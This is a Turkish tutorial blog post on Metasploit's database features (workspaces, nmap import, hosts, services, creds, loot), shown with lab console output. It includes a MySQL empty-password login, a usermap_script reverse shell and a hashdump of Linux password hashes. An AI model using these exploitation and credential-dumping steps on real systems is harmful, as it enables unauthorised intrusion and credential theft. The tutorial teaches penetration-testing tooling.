---
draft: false

title:  'MSF İçinde Database Kullanımı'
date: '2017-05-13T12:42:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'Metasploit Framework içerisinde, Postgresql desteğiyle sunulan veri tabanı özelliği çok kullanışlıdır ve yapılacak tarama sonuçlarını bir yerde kayıt altına alır. Bulunan sonuçların kayıt altına alınması, sonraki adımlarda kullanılacak IP adresleri, Port numaraları veya Hash Dump vb. bilgilerin exploitlere aktarılmasına kolaylık sağlar.' 
 
url:  /tr/msf-icinde-database-kullanimi/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


Metasploit Framework içerisinde, Postgresql desteğiyle sunulan veri tabanı özelliği çok kullanışlıdır ve yapılacak tarama sonuçlarını bir yerde kayıt altına alır. Bulunan sonuçların kayıt altına alınması, sonraki adımlarda kullanılacak IP adresleri, Port numaraları veya Hash Dump vb. bilgilerin exploitlere aktarılmasına kolaylık sağlar.



Aşağıdaki anlatımda, Kali işletim sistemi temel alınmıştır ve komutlar Kali’de denemiştir.



## Metasploit Veri tabanını Ayarlama



Öncelikle başlamamış ise postgresql başlatılmalıdır.


```bash
root@kali:~# systemctl start postgresql
```



Postgresql başladıktan sonra Veri tabanı ilk kullanıma hazırlanmalıdır. Bunun için ```msfdb init`` scriptini kullanabiliriz.


```bash
root@kali:~# msfdb init
Creating database user 'msf'
Enter password **for **new role: 
Enter it again: 
Creating databases 'msf' and 'msf_test'
Creating configuration file **in** /usr/share/metasploit-framework/config/database.yml
Creating initial database schema
```



## Workspace Kullanımı



msfconsole başladığında öncelikle `db_status` komutuyla veri tabanı bağlantısını kontrol edelim.


```bash
msf **>** db_status 
**[*********]** postgresql connected to msf
```



Veri tabanı bağlantısını sağladıktan sonra yapacağımız işleri **Workspace** olarak ifade edilen klasörlerde kayıt altına alarak organize edebiliriz. Normal bilgisayarlarda kayıtlarımızı nasıl klasörlerde konularına göre kayıt altına alıyorsak, msfconsole içinde aynı yaklaşım geçerlidir.



## Workspace Listeleme



Basitçe hiçbir parametre vermeden `workspace` komutunu verdiğinizde, mevcut kayıtlı çalışma klasörleri listelenir. O an için aktif olan workspace başında * işaretiyle belirtilir.


```bash
msf **>** workspace
***** default
  msfu
  lab1
  lab2
  lab3
  lab4
msf **>**
```



## Workspace Oluşturma ve Silme



Yeni bir Worksace oluşturmak için `-a` parametresi, silme için ise `-d` parametresi kullanılır. Parametrenin ardından oluşturmak veya silmek istediğimiz Workspace adını yazmanız yeterlidir.



<h3 class="wp-block-heading" id="lab4-workspace-oluşturulur">lab4 workspace oluşturulur


```bash
msf **>** workspace -a lab4
**[*********]** Added workspace: lab4
msf **>** 
```



<h3 class="wp-block-heading" id="lab4-workspace-silinir">lab4 workspace silinir


```bash
msf **>** workspace -d lab4 
**[*********]** Deleted workspace: lab4
msf **>** workspace
```



<h3 class="wp-block-heading" id="workspace-değiştirme">workspace değiştirme



`workspace` komutuyla mevcut klasörler listelendikten sonra aktif olan dışında başka bir klasöre geçmek istersek, aşağıdaki gibi `workspace` komutunun ardından geçmek istediğimiz klasörün adını yazmamız yeterlidir.


```bash
msf **>** workspace msfu
**[*********]** Workspace: msfu
msf **>** workspace
  default
***** msfu
  lab1
  lab2
  lab3
  lab4
msf **>**
```



<h3 class="wp-block-heading" id="workspace-yardım">Workspace Yardım



Detaylı yardım için `-h` parametresini kullanabilirsiniz.


```bash
msf **>** workspace -h
Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace **[**name]           Switch workspace
    workspace -a **[**name] ...    Add workspace**(**s**)**
    workspace -d **[**name] ...    Delete workspace**(**s**)**
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information

msf **>** 
```



Artık yapacağınız taramalarda elde edeceğiniz sonuçlar aktif olan workspace içerisinde kayıt edilecektir. Şimdi, sonraki adım olarak veri tabanı ile ilgili kullanabileceğimiz diğer komutlara bakalım.



Öncelikle, msfconsole veri tabanı ile ilgili hangi komutları bize sağlıyor ona bakalım. `msfconsole` içerisinde `help` komutu verdiğimizde veri tabanı komutları ayrı bir başlıkta aşağıdaki gibi bize gösterilir.


```bash
msf **>** help
...snip...

Database Backend Commands
**=========================**

    Command           Description
    -------           -----------
    creds             List all credentials **in **the database
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file **(**filetype will be auto-detected**)**
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts **in **the database
    loot              List all loot **in **the database
    notes             List all notes **in **the database
    services          List all services **in **the database
    vulns             List all vulnerabilities **in **the database
    workspace         Switch between database workspaces
```



## Veri Tabanı Kullanımı



Yukarıda, `help` komutuyla görüntülediğimiz komutları detaylı örnekleriyle görelim.



## db_import



Bu komut, msfconsole dışında nmap ile yaptığınız tarama sonuçlarını içeri aktarmamızı sağlar. ```nmap`` taramasının çıktısını **xml** formatında kaydetmiş olmalısınız.



Aşağıdaki örnekte, `/root/msfu/nmapScan` isimli dosya, msfconsole içerisine aktarılmaktadır. Tarama dosyasında bulunan IP adresleri, portlar, servisler ve diğer tüm sonuç bilgileri artık içeri aktarılmış olacaktır. `db_import` komutunun ardından verilen `hosts` komutuyla kontrol yapılmıştır.


```bash
msf **>**  db_import /root/msfu/nmapScan 
**[*********]** Importing 'Nmap XML' data
**[*********]** Import: Parsing with 'Rex::Parser::NmapXMLStreamParser'
**[*********]** Importing host 172.16.194.172
**[*********]** Successfully imported /root/msfu/nmapScan
msf **>** hosts

Hosts
**=====**

address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------  ---------  -----  -------  ----  --------
172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server         

msf **>** 
```



## db_nmap



nmap tarama sonuçlarını dışarıdan içeri aktarabileceğiniz gibi `msfconsole` sayesinde, içeride de dışarı çıkmadan nmap taraması yapabilirsiniz. Bunun için `db_nmap` komutu kullanılmaktadır. `db_nmap` ile yapacağınız taramalar, otomatik olarak aktif olan `workspace` içine kayıt edilecektir.


```bash
msf **>** db_nmap -A 172.16.194.134
**[*********]** Nmap: Starting Nmap 5.51SVN **(** <a href="http://nmap.org/">http://nmap.org</a> **)** at 2012-06-18 12:36 EDT
**[*********]** Nmap: Nmap scan report **for **172.16.194.134
**[*********]** Nmap: Host is up **(**0.00031s latency**)**.
**[*********]** Nmap: Not shown: 994 closed ports
**[*********]** Nmap: PORT     STATE SERVICE      VERSION
**[*********]** Nmap: 80/tcp   open  http         Apache httpd 2.2.17 **((**Win32**)** mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 

...snip...

**[*********]** Nmap: HOP RTT     ADDRESS
**[*********]** Nmap: 1   0.31 ms 172.16.194.134
**[*********]** Nmap: OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
**[*********]** Nmap: Nmap **done**: 1 IP address **(**1 host up**)** scanned **in **14.91 seconds
msf **>**


msf **>** hosts

Hosts
**=====**

address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------            ---------  -----  -------  ----  --------
172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server         
172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server         

msf **>** 
```



## db_export



Çalıştığınız bir projede yaptığınız tarama sonuçlarını dışarı aktarmak ve raporlarınızda kullanmak isteyebilirsiniz. Bunun için `db_export` komutunu bulunmaktadır. `db_export` komutuna `-f` parametresiyle beraber dosya ismini verdiğinizde, istediğiniz dosya belirttiğiniz dış klasöre aktarılır. Dışarı aktarımda iki farklı dosya çeşidi bulunur. `xml` formatında tüm bilgiler veya `pwdump` formatında kullanıcı adı ve parola vb. bilgiler.



Öncelikle yardım bilgisini görelim;


```bash
msf **>**  db_export -h
Usage:
    db_export -f  **[**-a**]** **[**filename]
    Format can be one of: xml, pwdump
**[**-] No output file was specified
```



Şimdi aktif olarak bulunduğumuz workspace içindeki bilgileri `xml` formatında dışa aktaralım.


```bash
msf **>** db_export -f xml /root/msfu/Exported.xml
**[*********]** Starting export of workspace msfu to /root/msfu/Exported.xml **[** xml **]**...
**[*********]**     **>>** Starting export of report
**[*********]**     **>>** Starting export of hosts
**[*********]**     **>>** Starting export of events
**[*********]**     **>>** Starting export of services
**[*********]**     **>>** Starting export of credentials
**[*********]**     **>>** Starting export of web sites
**[*********]**     **>>** Starting export of web pages
**[*********]**     **>>** Starting export of web forms
**[*********]**     **>>** Starting export of web vulns
**[*********]**     **>>** Finished export of report
**[*********]** Finished export of workspace msfu to /root/msfu/Exported.xml **[** xml **]**...
```



## hosts



`hosts` komutu, o ana kadar yapılan taramaların sonucunda bulunan IP bilgileri, PORT bilgileri vb. bilgileri bize gösterir. Öncelikle, `hosts` komutunun yardım bilgilerini görüntüleyelim.


```bash
msf **>** hosts -h
Usage: hosts **[** options **]** **[**addr1 addr2 ...]

OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c     Only show the given columns **(**see list below**)**
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o          Send output to a file **in **csv format
  -O        Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts
```



<h3 class="wp-block-heading" id="hosts-içinde-istenen-sütunları-görüntüleme">Hosts içinde istenen sütunları görüntüleme



`hosts` komutunu tek başına kullandığınızda kayıtlı bilgiler, aşağıda listesi bulunan sütunlarda organize edilerek gösterilir.



**Kullanılabilir Sütunlar:** address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags



Şimdi, sadece bilgilerini kullanacağımız sütunları ve bilgileri görüntüleyelim. Bunun için `-c` parametresini ve istediğimiz sütun adlarını yazmalıyız. Aşağıdaki örnekte, address, os_flavor sütunları ve bilgileri gösterilsin istenmiştir.


```bash
msf **>** hosts -c address,os_flavor

Hosts
**=====**

address         os_flavor
-------         ---------
172.16.194.134  XP
172.16.194.172  Ubuntu
```



## Hosts Bilgilerini Modüllerde Kullanma



Yaptığımız taramalarda elde edilen bilgilerin tutulduğu hosts listesinden bir takım bilgileri, kullanmak istediğimiz modüllere aktarabiliriz. Yukarıda kullandığımız `hosts -c address,os_flavor` komutuyla istediğimiz sütunları görüntülemiştik. Şimdi bu listede arama yapalım ve sonuçların içerisinde “Ubuntu” geçen satırı arayalım.


```bash
msf **>** hosts -c address,os_flavor -S Linux

Hosts
**=====**

address         os_flavor
-------         ---------
172.16.194.172  Ubuntu

msf **>**
```



İşte kullanacağımız IP Adresini bulduk. Şimdi bir modül içerisine girelim ve modülün ihtiyacı olan değişkenlere bakalım.


```bash
msf  auxiliary**(**tcp**)** **>** show options

Module options **(**auxiliary/scanner/portscan/tcp**)**:

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   FILTER                        no        The filter string **for **capturing traffic
   INTERFACE                     no        The name of the interface
   PCAPFILE                      no        The name of the PCAP capture file to process
   PORTS        1-10000          yes       Ports to scan **(**e.g. 22-25,80,110-900**)**
   RHOSTS                        yes       The target address range or CIDR identifier
   SNAPLEN      65535            yes       The number of bytes to capture
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout **in **milliseconds
```



Yukarıda çıktıda, RHOSTS değişken boş olarak görülmektedir. Buraya Remote Host IP adresinin girilmesi gerekiyor. Normalde işlemi `set RHOSTS 172.16.194.172` komutuyla girebilirsiniz. Ancak bunu birden çok modül içinde ayarlamak, her seferinde hata yapa ihtimalinizi de arttıracaktır.



Bu durumda `hosts -c address,os_flavor -S Linux` komutuyla yaptığımız arama ile bulduğumuz IP adresini, sonuna `-R` parametresini ekleyerek doğrudan içinde bulunduğumuz modüle aktarabiliriz. Aşağıdaki örnekte görüldüğü gibi “Ubuntu” IP adresi direkt olarak `tcp` modülüne aktarılmıştır.


```bash
msf  auxiliary**(**tcp**)** **>** hosts -c address,os_flavor -S Linux -R

Hosts
**=====**

address         os_flavor
-------         ---------
172.16.194.172  Ubuntu

RHOSTS **=>** 172.16.194.172

msf  auxiliary**(**tcp**)** **>** run

**[*********]** 172.16.194.172:25 - TCP OPEN
**[*********]** 172.16.194.172:23 - TCP OPEN
**[*********]** 172.16.194.172:22 - TCP OPEN
**[*********]** 172.16.194.172:21 - TCP OPEN
**[*********]** 172.16.194.172:53 - TCP OPEN
**[*********]** 172.16.194.172:80 - TCP OPEN

...snip...

**[*********]** 172.16.194.172:5432 - TCP OPEN
**[*********]** 172.16.194.172:5900 - TCP OPEN
**[*********]** 172.16.194.172:6000 - TCP OPEN
**[*********]** 172.16.194.172:6667 - TCP OPEN
**[*********]** 172.16.194.172:6697 - TCP OPEN
**[*********]** 172.16.194.172:8009 - TCP OPEN
**[*********]** 172.16.194.172:8180 - TCP OPEN
**[*********]** 172.16.194.172:8787 - TCP OPEN
**[*********]** Scanned 1 of 1 hosts **(**100% complete**)**
**[*********]** Auxiliary module execution completed
```



hosts listesinde arama ile filtre yapmadan, mevcut bulunan tüm IP adreslerini de aktif olan modüle aktarabiliriz. Bu durumda `hosts` komutuna hiçbir arama ifadesi girmeden sadece `-R` parametresi vermeniz yeterli olacaktır.


```bash
msf  auxiliary**(**tcp**)** **>** hosts -R

Hosts
**=====**

address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------            ---------  -----  -------  ----  --------
172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server         
172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server         

RHOSTS **=>** 172.16.194.134 172.16.194.172

msf  auxiliary**(**tcp**)** **>** show options

Module options **(**auxiliary/scanner/portscan/tcp**)**:

   Name         Current Setting                Required  Description
   ----         ---------------                --------  -----------
   CONCURRENCY  10                             yes       The number of concurrent ports to check per host
   FILTER                                      no        The filter string **for **capturing traffic
   INTERFACE                                   no        The name of the interface
   PCAPFILE                                    no        The name of the PCAP capture file to process
   PORTS        1-10000                        yes       Ports to scan **(**e.g. 22-25,80,110-900**)**
   RHOSTS       172.16.194.134 172.16.194.172  yes       The target address range or CIDR identifier
   SNAPLEN      65535                          yes       The number of bytes to capture
   THREADS      1                              yes       The number of concurrent threads
   TIMEOUT      1000                           yes       The socket connect timeout **in **milliseconds
```



Yukarıda gördüğünüz gibi tüm IP adresleri RHOSTS içine aktarılmıştır. Birkaç IP adresini elle girmek zaman alıcı olmasa da yüzlerce IP adresinde bir modülü çalıştırmak istediğinizde bu özelliğe mutlaka ihtiyaç duyacaksınız.



Örneğin, bir ağda tarama yaptınız ve 112 adet aktif olarak açık cihaz ve IP adresi buldunuz. Bunların hepsine **smb_version** modülünü denemek istiyorsunuz. İşte bu noktada `hosts -R` komutu işleri çok kolaylaştıracaktır.



## Services



`hosts` komutu taramalarda bulunan IP ve diğer bilgileri verirken, `services` komutu da bu IP adreslerinde çalışan ve keşfedilen servisleri listeler. Tabii ki `db_nmap` komutu ile servis ve versiyon taraması yapmış olmanız gerekmektedir.



Öncelikle yardım bilgilerini görüntüleyelim.


```bash
msf **>** services -h

Usage: services **[**-h**]** **[**-u**]** **[**-a**]** **[**-r **]** **[**-p **>**port1,port2>] **[**-s **>**name1,name2>] **[**-o **]** **[**addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c     Only show the given columns
  -h,--help         Show this help information
  -s   Search **for **a list of service names
  -p   Search **for **a list of ports
  -r      Only show **[**tcp|udp] services
  -u,--up           Only show services which are up
  -o          Send output to a file **in **csv format
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
```



`services` komutu, bilgileri aşağıdaki sütunlarda organize ederek bize gösterir.



**Kullanılabilir sütunlar:** created_at, info, name, port, proto, state, updated_at



`hosts` komutunda nasıl arama yapıyorsak `services` içinde `-c` parametresi ile sütunlarda ve `-S` parametresi ile de belirli bir ifadeyi arayabiliriz.



<h3 class="wp-block-heading" id="belirli-sütunlarda-arama">Belirli Sütunlarda Arama


```bash
msf **>** services -c name,info 172.16.194.134

Services
**========**

host            name          info
----            ----          ----
172.16.194.134  http          Apache httpd 2.2.17 **(**Win32**)** mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1 
172.16.194.134  msrpc         Microsoft Windows RPC 
172.16.194.134  netbios-ssn   
172.16.194.134  http          Apache httpd 2.2.17 **(**Win32**)** mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1 
172.16.194.134  microsoft-ds  Microsoft Windows XP microsoft-ds 
172.16.194.134  mysql 
```



<h3 class="wp-block-heading" id="belirli-sütunlarda-özel-bir-i̇fadeyi-arama">Belirli Sütunlarda Özel Bir İfadeyi Arama


```bash
msf **>** services -c name,info -S http

Services
**========**

host            name  info
----            ----  ----
172.16.194.134  http  Apache httpd 2.2.17 **(**Win32**)** mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1 
172.16.194.134  http  Apache httpd 2.2.17 **(**Win32**)** mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1 
172.16.194.172  http  Apache httpd 2.2.8 **(**Ubuntu**)** DAV/2 
172.16.194.172  http  Apache Tomcat/Coyote JSP engine 1.1 
```



<h3 class="wp-block-heading" id="belirli-bir-portun-bulunduğu-sütunları-arama">Belirli Bir Portun Bulunduğu Sütunları Arama


```bash
msf **>** services -c info,name -p 445

Services
**========**

host            info                                  name
----            ----                                  ----
172.16.194.134  Microsoft Windows XP microsoft-ds     microsoft-ds
172.16.194.172  Samba smbd 3.X workgroup: WORKGROUP   netbios-ssn
```



<h3 class="wp-block-heading" id="belirli-bir-port-aralığında-i̇stenen-sütunları-arama">Belirli Bir Port Aralığında İstenen Sütunları Arama


```bash
msf **>** services -c port,proto,state -p 70-81
Services
**========**
host           port proto state
----           ---- ----- -----
172.16.194.134 80   tcp   open
172.16.194.172 75   tcp   closed
172.16.194.172 71   tcp   closed
172.16.194.172 72   tcp   closed
172.16.194.172 73   tcp   closed
172.16.194.172 74   tcp   closed
172.16.194.172 70   tcp   closed
172.16.194.172 76   tcp   closed
172.16.194.172 77   tcp   closed
172.16.194.172 78   tcp   closed
172.16.194.172 79   tcp   closed
172.16.194.172 80   tcp   open
172.16.194.172 81   tcp  closed
```



<h3 class="wp-block-heading" id="belirli-bir-servisin-ve-ip-adresinin-port-bilgisini-arama">Belirli Bir Servisin ve IP Adresinin Port Bilgisini Arama



Yukarıda bir kaç örnekte `-S` büyük S ile belli bir ifadeyi aramıştık. `-s` parametresi de özellikle servisler listesinde arama yapmayı kolaylaştırır.


```bash
msf **>** services -s http -c port 172.16.194.134
Services
**========**
host           port
----           ----
172.16.194.134 80
172.16.194.134 443
```



<h3 class="wp-block-heading" id="servisler-i̇çinde-bir-ifadeyi-arama">Servisler İçinde Bir ifadeyi arama


```bash
msf **>** services -S Unr

Services
**========**
host           port proto name state info
----           ---- ----- ---- ----- ----
172.16.194.172 6667 tcp   irc  open  Unreal ircd
172.16.194.172 6697 tcp   irc  open  Unreal ircd
```



## CSV Export



Hem `hosts` hem de `services` listelerinde kayıtlı bulunan bilgilerde yaptığımız arama sonuçlarını ekrana yazdırmak ile birlikte CSV formatında virgülle ayrılmış dosya biçiminde dışarı da aktarabilirsiniz. Aşağıda bir kaç örnek görülmektedir.


```bash
msf **>** services -s http -c port 172.16.194.134 -o /root/msfu/http.csv

**[*********]** Wrote services to /root/msfu/http.csv

msf **>** hosts -S Linux -o /root/msfu/linux.csv
**[*********]** Wrote hosts to /root/msfu/linux.csv

msf **>** cat /root/msfu/linux.csv
**[*********]** exec: cat /root/msfu/linux.csv

address,mac,name,os_name,os_flavor,os_sp,purpose,info,comments
"172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server","",""

msf **>** cat /root/msfu/http.csv
**[*********]** exec: cat /root/msfu/http.csv

host,port
"172.16.194.134","80"
"172.16.194.134","443"
```



## Creds



`creds` komutu da `hosts` ve `services` komutlarına benzer olarak taramalarda elde edilen kullanıcı bilgileri ve parolaları bize gösterir. Hiçbir ek parametre girmeden `creds` komutunu verdiğinizde kayıtlı tüm kullanıcı bilgileri listelenir.


```bash
msf **>** creds

Credentials
**===========**

host  port  user  pass  type  active?
----  ----  ----  ----  ----  -------

**[*********]** Found 0 credentials.
```



`db_nmap` komutuyla yapılan aramalarda bulunan sonuçlar nasıl `hosts` ve `services` tablolarında tutuluyorsa, herhangi bir kullanıcı adı, parola bulma modülü kullandığınızda elde ettiğiniz bilgiler de `creds` tablosu içinde tutulur. Bir örnek görelim. Bu örnekte `mysql_login` modülü çalıştırılmakta ve 172.16.194.172 Ip adresinde çalışan MySql servisine login olarak oturum açma denemesi yapılmaktadır. Başarılı olunduğunda, başarılı olan kullanıcı adı ve parola bilgisi `creds` tablosuna sonradan kullanım için kayıt edilmektedir.


```bash
msf  auxiliary**(**mysql_login**)** **>** run

**[*********]** 172.16.194.172:3306 MYSQL - Found remote MySQL version 5.0.51a
**[*********]** 172.16.194.172:3306 MYSQL - **[**1/2] - Trying username:'root' with password:''
**[*********]** 172.16.194.172:3306 - SUCCESSFUL LOGIN 'root' : ''
**[*********]** Scanned 1 of 1 hosts **(**100% complete**)**
**[*********]** Auxiliary module execution completed


msf  auxiliary**(**mysql_login**)** **>** creds 

Credentials
**===========**

host            port  user  pass  type      active?
----            ----  ----  ----  ----      -------
172.16.194.172  3306  root        password  true

**[*********]** Found 1 credential.
msf  auxiliary**(**mysql_login**)** **>**
```



<h3 class="wp-block-heading" id="creds-tablosuna-elle-veri-ekleme">Creds Tablosuna Elle Veri Ekleme



Bir sistemde oturum açtığınızda, modül kullanmadan kendiniz bulduğunuz kullanıcı adı ve parola bilgilerini de, aşağıdaki örnekteki formatı kullanarak, sonradan kullanmak üzere `creds` tablosuna aktarabilirsiniz


```bash
msf **>** creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
**[*********]** Time: 2012-06-20 20:31:42 UTC Credential: host**=**172.16.194.134 port**=**445 proto**=**tcp sname**=** type**=**password user**=**Administrator pass**=**7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: active**=**true

msf **>** creds

Credentials
**===========**

host            port  user           pass                                                                  type      active?
----            ----  ----           ----                                                                  ----      -------
172.16.194.134  445   Administrator  7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::  password  true

**[*********]** Found 1 credential.
```



## Loot



Oturum açılan bir sistemde, genellikle ilk olarak `hashdump` yapılarak hash tablosu çıkarılır. İşte `loot` komutuyla, tarama sonucu elde edilen hash değerlerinin bilgisi görülebilir. Aşağıdaki örnekte, `loot` yardım görüntülenmektedir.


```bash
msf **>** loot -h
Usage: loot 
 Info: loot **[**-h**]** **[**addr1 addr2 ...] **[**-t **]**
  Add: loot -f **[**fname] -i **[**info] -a **[**addr1 addr2 ...] **[**-t **[**type**]**
  Del: loot -d **[**addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *****all***** loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t   Search **for **a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
```



Ardından **usermap_script** modülü kullanılarak karşı sistemde oturum açılmakta ve açılan session yani oturum için, **hashdump** modülü ile hash değerleri bulunmaktadır. Başarılı olunduğu takdirde bulunan hash değerleri sonradan kullanım için `loot` tablosuna kayıt edilmektedir.


```bash
msf  exploit**(**usermap_script**)** **>** exploit

**[*********]** Started reverse double handler
**[*********]** Accepted the first client connection...
**[*********]** Accepted the second client connection...
**[*********]** Command: echo 4uGPYOrars5OojdL;
**[*********]** Writing to socket A
**[*********]** Writing to socket B
**[*********]** Reading from sockets...
**[*********]** Reading from socket B
**[*********]** B: "4uGPYOrars5OojdL\r "
**[*********]** Matching...
**[*********]** A is input...
**[*********]** Command shell session 1 opened **(**172.16.194.163:4444 -> 172.16.194.172:55138**)** at 2012-06-27 19:38:54 -0400

^Z
Background session 1? **[**y/N]  y

msf  exploit**(**usermap_script**)** **>** use post/linux/gather/hashdump
msf  post**(**hashdump**)** **>** show options

Module options **(**post/linux/gather/hashdump**)**:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf  post**(**hashdump**)** **>** sessions -l

Active sessions
**===============**

  Id  Type        Information  Connection
  --  ----        -----------  ----------
  1   shell unix               172.16.194.163:4444 -> 172.16.194.172:55138 **(**172.16.194.172**)**

msf  post**(**hashdump**)** **>** run

**[**+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
**[**+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
**[**+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
**[**+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
**[**+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
**[**+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
**[**+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
**[**+] Unshadowed Password File: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
**[*********]** Post module execution completed
```



Veri tabanında kayıtlı hash değerlerini görmek için `loot` komutunu vermeniz yeterlidir.


```bash
msf  post**(**hashdump**)** **>** loot

Loot
**====**

host            service  type          name                   content     info                            path
----            -------  ----          ----                   -------     ----                            ----
172.16.194.172           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
172.16.194.172           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.passwd_953644.txt
172.16.194.172           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948.txt
```



Bu yazımızda, `msfconsole` içerisinde verilen `help` komutunda gösterilen `Database` ile ilgili komutları açıklamaya çalıştık.


```bash
Database Backend Commands
**=========================**

    Command           Description
    -------           -----------
    creds             List all credentials **in **the database
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file **(**filetype will be auto-detected**)**
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts **in **the database
    loot              List all loot **in **the database
    notes             List all notes **in **the database
    services          List all services **in **the database
    vulns             List all vulnerabilities **in **the database
    workspace         Switch between database workspaces
```



`vulns` komutunu eksik bıraktığımızı düşünebilirsiniz. `vulns` komutunun ne işe yaradığını az çok tahmin etmek mümkündür. Yazı yeterince uzun oldu. `vulns` komutunu size bırakıyorum.
